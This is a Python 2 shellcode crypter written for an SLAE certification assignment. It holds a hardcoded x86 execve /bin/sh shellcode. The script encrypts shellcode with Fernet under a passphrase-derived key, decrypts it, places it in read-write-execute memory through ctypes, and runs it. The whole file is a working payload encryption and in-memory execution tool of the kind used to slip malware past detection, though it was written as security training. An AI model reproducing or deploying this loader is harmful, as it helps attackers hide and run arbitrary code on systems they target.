#Author: Aaron Weathersby
#SLAE #1488
#Handle: t0b0x0r
#github:#github:https://github.com/t0b0rX0r/slae/upload/master/assignment7
#Assignment #7 Crypter
#created for completing the requirements of the SecurityTube Linux Assembly Expert certification: http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert


import base64
import os
import sys
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
from cryptography.fernet import Fernet
from ctypes import CDLL, c_char_p, c_void_p, memmove, cast, CFUNCTYPE
import binascii



def main():
	default=""
	code=""
	encoded=""
	if len(sys.argv) ==2:
		#Preshell Code for /bin/sh
		code="\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80"
		default=True
	elif len(sys.argv) >3 or len(sys.argv)==1:#or len(sys.argv)==3:
		print "Format: slae-assignment7-encrypt.py <key> <hexcode>"
		print "			OR"
		print "Format: slae-assignment7-encrypt.py <key> (a default shell of /bin/sh will be used)"
		sys.exit(1)
			
	elif len(sys.argv)==3:
		code=sys.argv[2].replace('\\x', '').decode('hex')
	#encoded=""
	total = len(sys.argv)
	message=""
	#Code Snippet from tutorialsploit / using cryptography library
	#**************************************************************
	password_provided=sys.argv[1]
	password = password_provided.encode() # Convert to type bytes
	salt = b'salt_' # CHANGE THIS - recommend using a key from os.urandom(16), must be of type bytes
	kdf = PBKDF2HMAC(
	    algorithm=hashes.SHA256(),
	    length=32,
	    salt=salt,
	    iterations=100000,
	    backend=default_backend()
	)
	key = base64.urlsafe_b64encode(kdf.derive(password)) # Can only use kdf once
	#**************************************************************
	print "Provided Passphrase: "+sys.argv[1]	
	print "Key: "+str(key)
	

	
	encoded=""
	f = Fernet(key)
	
	codeencrypted=f.encrypt(code)
	for x in bytearray(code):
			
		if default==True:	
			encoded+='\\x'
			encoded+='%02x' % x
		else:
			encoded+=str(x)

	if (default):
	
		print "Default Shell Code is a /bin/sh"
	
	print "Orginal Shell: "+ '"'+str(encoded)+'"'
	print ("Encrypted Message: "+str(codeencrypted))
	ce=""
	for x in bytearray(codeencrypted):
		#print x
		ce+='\\x'
		ce+='%02x' % x
	print "Encrypted Shell: "+ '"'+ce+'"'
	codedecrypted=f.decrypt(codeencrypted)
	decoded=""
	decodedrun=""
	for x in bytearray(code):
			
			
		decoded+='\\x'
		decoded+='%02x' % x
		decodedrun+=str(x)
	print "DeEncrypted Message: "+str(decoded)#codedecrypted)
	libc = CDLL('libc.so.6')
	print "Executing Shell Code:"
	shellcode = codedecrypted#bytearray(decodedrun)#hex(decoded)#.decode('hex')
#code snippet to run shell from python found at http://hacktracking.blogspot.com/2015/05/execute-shellcode-in-python.html
	sc = c_char_p(shellcode)
	size = len(shellcode)
	addr = c_void_p(libc.valloc(size))
	memmove(addr, sc, size)
	libc.mprotect(addr, size, 0x7)
	run = cast(addr, CFUNCTYPE(c_void_p))
	run()	
	
		

if __name__== "__main__":
  main()
